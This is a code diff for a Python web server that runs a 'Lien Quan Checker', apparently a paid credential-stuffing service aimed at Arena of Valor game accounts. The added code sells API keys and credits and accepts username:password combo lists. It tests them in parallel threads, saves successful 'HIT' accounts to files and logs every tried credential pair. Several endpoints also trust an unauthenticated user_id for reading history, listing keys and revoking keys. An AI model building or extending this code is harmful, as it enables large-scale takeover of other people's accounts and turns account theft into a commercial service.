@@ -1,10 +1,13 @@
 """
 Web Server for Lien Quan Checker - SaaS & Developer REST API Edition
 Includes:
-- User Authentication (Register / Login / Profile)
-- API Key Service (Generate / Validate / Deduct Credits)
-- External REST API: POST /api/v1/check (Header: Authorization: Bearer <API_KEY>)
-- Web Dashboard & Batch Checker
+- User Authentication (Register / Login / Profile / Giftcodes)
+- API Key Service (Generate / Revoke / Validate / Deduct Credits)
+- External Developer REST API:
+    * POST /api/v1/check (Header: Authorization: Bearer <API_KEY>)
+    * POST /api/v1/check-batch (Batch processing via Developer API)
+    * GET /api/v1/me & GET /api/v1/user/me
+- Web Dashboard, Check History & Live Monospace Batch Stream
 """
 import json
 import mimetypes
@@ -13,6 +16,7 @@ import sys
 import threading
 import time
 import urllib.parse
+import uuid
 import webbrowser
 from concurrent.futures import ThreadPoolExecutor
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
@@ -29,10 +33,17 @@ from core.db import (
     init_db,
     register_user,
     login_user,
+    get_user_profile,
     validate_api_key,
     deduct_credit,
+    add_credits,
     generate_new_api_key,
-    get_user_keys
+    revoke_api_key,
+    get_user_keys,
+    save_check_history,
+    get_user_history,
+    clear_user_history,
+    redeem_giftcode
 )
 
 # Initialize Database on server start
@@ -75,7 +86,7 @@ class AOVWebHandler(BaseHTTPRequestHandler):
             return auth[7:].strip()
         if auth.startswith("Token "):
             return auth[6:].strip()
-        # Check query string ?key=...
+        # Check query string ?key=... or ?api_key=...
         parsed = urllib.parse.urlparse(self.path)
         qs = urllib.parse.parse_qs(parsed.query)
         if "key" in qs:
@@ -87,38 +98,67 @@ class AOVWebHandler(BaseHTTPRequestHandler):
     def do_GET(self):
         parsed = urllib.parse.urlparse(self.path)
         path = parsed.path
+        query = urllib.parse.parse_qs(parsed.query)
 
         # ── 1. Developer REST API: Check API Key status & balance ─────────────
-        if path in ("/api/v1/me", "/api/user/me"):
+        if path in ("/api/v1/me", "/api/v1/user/me", "/api/user/me"):
             api_key = self._get_api_key_from_request()
-            v = validate_api_key(api_key)
-            if not v["valid"]:
-                self._send_json({"success": False, "error": v["error"]}, 401)
+            uid = query.get("user_id", [""])[0]
+            if api_key:
+                v = validate_api_key(api_key)
+                if not v["valid"]:
+                    self._send_json({"success": False, "error": v["error"]}, 401)
+                    return
+                self._send_json({
+                    "success": True,
+                    "status": "ok",
+                    "user": {
+                        "id": v["user_id"],
+                        "username": v["username"],
+                        "credits": v["credits"],
+                        "role": v["role"]
+                    }
+                })
                 return
-            self._send_json({
-                "success": True,
-                "user": {
-                    "username": v["username"],
-                    "credits": v["credits"],
-                    "role": v["role"]
-                }
-            })
-            return
+            elif uid and uid.isdigit():
+                prof = get_user_profile(int(uid))
+                self._send_json(prof, 200 if prof["success"] else 404)
+                return
+            else:
+                self._send_json({"success": False, "error": "Thiếu Authorization header hoặc user_id"}, 401)
+                return
 
         # ── 2. Get User Keys ──────────────────────────────────────────────────
-        if path == "/api/user/keys":
-            query = urllib.parse.parse_qs(parsed.query)
+        if path in ("/api/user/keys", "/api/keys/list"):
             uid = query.get("user_id", [""])[0]
             if not uid or not uid.isdigit():
-                self._send_json({"error": "Thiếu user_id hợp lệ"}, 400)
+                # Check via api_key
+                api_key = self._get_api_key_from_request()
+                if api_key:
+                    v = validate_api_key(api_key)
+                    if v["valid"]:
+                        uid = str(v["user_id"])
+            if not uid or not uid.isdigit():
+                self._send_json({"success": False, "error": "Thiếu user_id hợp lệ"}, 400)
                 return
             keys = get_user_keys(int(uid))
-            self._send_json({"success": True, "keys": keys})
+            self._send_json({"success": True, "status": "ok", "keys": keys})
             return
 
-        # ── 3. Web Batch Task Status ──────────────────────────────────────────
+        # ── 3. Check History API ──────────────────────────────────────────────
+        if path == "/api/user/history":
+            uid = query.get("user_id", [""])[0]
+            if not uid or not uid.isdigit():
+                self._send_json({"success": False, "error": "Thiếu user_id hợp lệ"}, 400)
+                return
+            limit = int(query.get("limit", [200])[0])
+            status_filter = query.get("status", [""])[0] or None
+            history = get_user_history(int(uid), limit=limit, filter_status=status_filter)
+            self._send_json({"success": True, "status": "ok", "history": history, "total": len(history)})
+            return
+
+        # ── 4. Web Batch Task Status ──────────────────────────────────────────
         if path == "/api/task-status":
-            query = urllib.parse.parse_qs(parsed.query)
             task_id = query.get("task_id", [""])[0] or query.get("id", [""])[0]
             with _TASKS_LOCK:
                 task = _TASKS.get(task_id)
@@ -139,7 +179,7 @@ class AOVWebHandler(BaseHTTPRequestHandler):
             self._send_json(resp_data)
             return
 
-        # ── 4. Static Files Serving ───────────────────────────────────────────
+        # ── 5. Static Files Serving ───────────────────────────────────────────
         if path in ("/", "/index.html"):
             file_path = os.path.join(STATIC_DIR, "index.html")
         else:
@@ -193,7 +233,7 @@ class AOVWebHandler(BaseHTTPRequestHandler):
         # ── 3. API KEYS: CREATE NEW KEY ───────────────────────────────────────
         if path in ("/api/keys/generate", "/api/keys/create"):
             uid = payload.get("user_id")
-            name = payload.get("name", "New Key")
+            name = payload.get("name", "Default Key")
             if not uid:
                 self._send_json({"success": False, "error": "Thiếu user_id"}, 400)
                 return
@@ -201,7 +241,40 @@ class AOVWebHandler(BaseHTTPRequestHandler):
             self._send_json(res)
             return
 
-        # ── 4. DEVELOPER REST API: CHECK SINGLE (/api/v1/check) ───────────────
+        # ── 4. API KEYS: REVOKE KEY ───────────────────────────────────────────
+        if path in ("/api/keys/revoke", "/api/keys/delete"):
+            uid = payload.get("user_id")
+            key_val = payload.get("api_key") or payload.get("key")
+            if not uid or not key_val:
+                self._send_json({"success": False, "error": "Thiếu user_id hoặc api_key"}, 400)
+                return
+            res = revoke_api_key(int(uid), str(key_val))
+            self._send_json(res)
+            return
+
+        # ── 5. USER: REDEEM GIFTCODE ──────────────────────────────────────────
+        if path in ("/api/user/redeem", "/api/redeem"):
+            uid = payload.get("user_id")
+            code = payload.get("code", "").strip()
+            if not uid or not code:
+                self._send_json({"success": False, "error": "Thiếu user_id hoặc mã Giftcode"}, 400)
+                return
+            res = redeem_giftcode(int(uid), code)
+            status_code = 200 if res["success"] else 400
+            self._send_json(res, status_code)
+            return
+
+        # ── 6. USER: CLEAR HISTORY ────────────────────────────────────────────
+        if path in ("/api/user/history/clear", "/api/history/clear"):
+            uid = payload.get("user_id")
+            if not uid:
+                self._send_json({"success": False, "error": "Thiếu user_id"}, 400)
+                return
+            res = clear_user_history(int(uid))
+            self._send_json(res)
+            return
+
+        # ── 7. DEVELOPER REST API: CHECK SINGLE (/api/v1/check) ───────────────
         if path == "/api/v1/check":
             api_key = self._get_api_key_from_request() or payload.get("api_key", "")
             val = validate_api_key(api_key)
@@ -211,12 +284,22 @@ class AOVWebHandler(BaseHTTPRequestHandler):
 
             acc = payload.get("account", "").strip()
             pwd = payload.get("password", "").strip()
+
+            # Support "acc:pwd" single combo inside account field
+            if acc and not pwd:
+                u, p = parse_combo_line(acc)
+                if u and p:
+                    acc, pwd = u, p
+
             if not acc or not pwd:
-                self._send_json({"success": False, "error": "Vui lòng nhập account và password!"}, 400)
+                self._send_json({"success": False, "error": "Vui lòng nhập account và password (hoặc account:password)!"}, 400)
                 return
 
             res = check_account(acc, pwd)
             deduct_credit(val["user_id"], 1)
+
+            # Save to history
+            save_check_history(val["user_id"], f"{acc}:{pwd}", res.get("status", "FAIL"), res)
 
             if res.get("status") == "HIT":
                 print(f"[REST API v1] [{val['username']}] {format_account_full_info(res)}", flush=True)
@@ -225,13 +308,107 @@ class AOVWebHandler(BaseHTTPRequestHandler):
 
             self._send_json({
                 "success": True,
+                "status": "ok",
                 "formatted": format_account_full_info(res),
                 "credits_remaining": max(0, val["credits"] - 1),
                 "data": res
             })
             return
 
-        # ── 5. WEB UI: CHECK SINGLE ───────────────────────────────────────────
+        # ── 8. DEVELOPER REST API: CHECK BATCH (/api/v1/check-batch) ──────────
+        if path == "/api/v1/check-batch":
+            api_key = self._get_api_key_from_request() or payload.get("api_key", "")
+            val = validate_api_key(api_key)
+            if not val["valid"]:
+                self._send_json({"success": False, "error": val["error"]}, 401)
+                return
+
+            combos_raw = payload.get("combos", [])
+            threads = int(payload.get("threads", 5) or 5)
+            threads = max(1, min(threads, 30))
+
+            combos = []
+            for item in combos_raw:
+                u, p = parse_combo_line(str(item))
+                if u and p:
+                    combos.append((u, p))
+
+            if not combos:
+                self._send_json({"success": False, "error": "Danh sách combos trống hoặc sai định dạng!"}, 400)
+                return
+
+            # Check if user has enough credits
+            if val["role"] != "admin" and val["credits"] < len(combos):
+                self._send_json({
+                    "success": False,
+                    "error": f"Không đủ Credits! Cần {len(combos)} Credits nhưng bạn chỉ còn {val['credits']} Credits."
+                }, 402)
+                return
+
+            task_id = str(uuid.uuid4())[:8]
+            task_state = {
+                "total": len(combos),
+                "done": 0,
+                "hits": 0,
+                "trang": 0,
+                "invalid": 0,
+                "is_running": True,
+                "results": [],
+                "all_hits": [],
+            }
+
+            with _TASKS_LOCK:
+                _TASKS[task_id] = task_state
+
+            # Launch background worker thread
+            def run_api_batch():
+                os.makedirs("results", exist_ok=True)
+                live_path = os.path.join("results", f"api_hits_{task_id}.txt")
+                trang_path = os.path.join("results", f"api_trang_{task_id}.txt")
+
+                def check_worker(pair):
+                    a, p = pair
+                    r = check_account(a, p)
+                    with _TASKS_LOCK:
+                        task_state["done"] += 1
+                        task_state["results"].append(r)
+                        if r["status"] == "HIT":
+                            task_state["hits"] += 1
+                            task_state["all_hits"].append(r)
+                            full_line = format_account_full_info(r)
+                            if r.get("is_trang"):
+                                task_state["trang"] += 1
+                                with open(trang_path, "a", encoding="utf-8") as ft:
+                                    ft.write(full_line + "\n")
+                            with open(live_path, "a", encoding="utf-8") as fh:
+                                fh.write(full_line + "\n")
+                        else:
+                            if r["status"] == "INVALID":
+                                task_state["invalid"] += 1
+
+                    # Save history
+                    save_check_history(val["user_id"], f"{a}:{p}", r.get("status", "FAIL"), r)
+
+                with ThreadPoolExecutor(max_workers=threads) as executor:
+                    executor.map(check_worker, combos)
+
+                with _TASKS_LOCK:
+                    task_state["is_running"] = False
+
+                deduct_credit(val["user_id"], len(combos))
+
+            threading.Thread(target=run_api_batch, daemon=True).start()
+            self._send_json({
+                "success": True,
+                "status": "ok",
+                "task_id": task_id,
+                "total": len(combos),
+                "threads": threads,
+                "poll_url": f"/api/task-status?task_id={task_id}"
+            })
+            return
+
+        # ── 9. WEB UI: CHECK SINGLE ───────────────────────────────────────────
         if path == "/api/check-single":
             acc = payload.get("account", "").strip()
             pwd = payload.get("password", "").strip()
@@ -239,12 +416,15 @@ class AOVWebHandler(BaseHTTPRequestHandler):
                 self._send_json({"error": "Vui lòng nhập tài khoản và mật khẩu"}, 400)
                 return
 
-            # Optional credit check if logged in
             uid = payload.get("user_id")
             if uid:
                 deduct_credit(int(uid), 1)
 
             res = check_account(acc, pwd)
+
+            if uid:
+                save_check_history(int(uid), f"{acc}:{pwd}", res.get("status", "FAIL"), res)
+
             if res.get("status") == "HIT":
                 print(f"[WEB SINGLE] {format_account_full_info(res)}", flush=True)
             else:
@@ -252,7 +432,7 @@ class AOVWebHandler(BaseHTTPRequestHandler):
             self._send_json(res)
             return
 
-        # ── 6. WEB UI: CHECK BATCH ────────────────────────────────────────────
+        # ── 10. WEB UI: CHECK BATCH ───────────────────────────────────────────
         elif path == "/api/check-batch":
             combos_raw = payload.get("combos", [])
             threads = int(payload.get("threads", 5) or 5)
@@ -269,7 +449,6 @@ class AOVWebHandler(BaseHTTPRequestHandler):
                 self._send_json({"error": "Không có danh sách tài khoản hợp lệ (hỗ trợ : | ; / khoảng trắng)!"}, 400)
                 return
 
-            import uuid
             task_id = str(uuid.uuid4())[:8]
 
             task_state = {
@@ -317,6 +496,9 @@ class AOVWebHandler(BaseHTTPRequestHandler):
                                 task_state["invalid"] += 1
                             print(f"{done_str} {a}:{p} | STATUS : {r.get('status')} | DETAIL : {r.get('message', 'FAIL')}", flush=True)
 
+                    if uid:
+                        save_check_history(int(uid), f"{a}:{p}", r.get("status", "FAIL"), r)
+
                 with ThreadPoolExecutor(max_workers=threads) as executor:
                     executor.map(check_worker, combos)
 
@@ -347,8 +529,9 @@ def start_web_server(port: int = 8080, auto_open: bool = True):
 
     local_url = f"http://127.0.0.1:{port}"
     print("\n" + "=" * 62)
-    print(f"  [WEB SERVER RUNNING] : {local_url}")
-    print(f"  [MOBILE LAN ACCESS]  : http://<YOUR_LAN_IP>:{port}")
+    print(f"  [AOV CHECKER SAAS WEB ENGINE RUNNING] : {local_url}")
+    print(f"  [DEVELOPER REST API ENDPOINT]         : {local_url}/api/v1/check")
+    print(f"  [MOBILE LAN ACCESS]                   : http://<YOUR_LAN_IP>:{port}")
     print("=" * 62 + "\n")
 
     if auto_open:
@@ -360,5 +543,5 @@ def start_web_server(port: int = 8080, auto_open: bool = True):
     try:
         httpd.serve_forever()
     except KeyboardInterrupt:
-        print("\n[!] Da dung Web Server.")
+        print("\n[!] Đã dừng Web Server.")
         httpd.server_close()
